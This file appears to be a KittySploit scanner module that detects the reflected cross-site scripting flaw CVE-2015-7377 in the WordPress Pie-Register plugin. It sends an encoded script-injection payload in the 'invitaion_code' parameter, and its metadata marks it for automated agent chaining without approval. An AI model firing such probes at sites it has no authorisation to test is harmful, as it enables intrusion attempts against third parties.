#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Pie Register before 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Pie-Register <2.0.19 - Cross-Site Scripting Detection',
        'description': 'WordPress Pie Register before 2.0.19 contains a reflected cross-site scripting vulnerability in pie-register/pie-register.php which allows remote attackers to inject arbitrary web script or HTML via the invitaion_code parameter in a pie-register page to the default URL.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2015', 'wordpress', 'wp-plugin', 'xss', 'packetstorm', 'genetechsolutions', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/133928/WordPress-Pie-Register-2.0.18-Cross-Site-Scripting.html',
            'https://github.com/GTSolutions/Pie-Register/blob/2.0.19/readme.txt',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-7377',
            'http://packetstormsecurity.com/files/133928/WordPress-Pie-Register-2.0.18-Cross-Site-Scripting.html',
            'https://wpvulndb.com/vulnerabilities/8212',
        ],
        'cve': 'CVE-2015-7377',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?page=pie-register&show_dash_widget=1&invitaion_code=PC9zY3JpcHQ+PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Pie-Register <2.0.19 - Cross-Site Scripting detected",
                path='/?page=pie-register&show_dash_widget=1&invitaion_code=PC9zY3JpcHQ+PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+',
            )
            return True
        return False

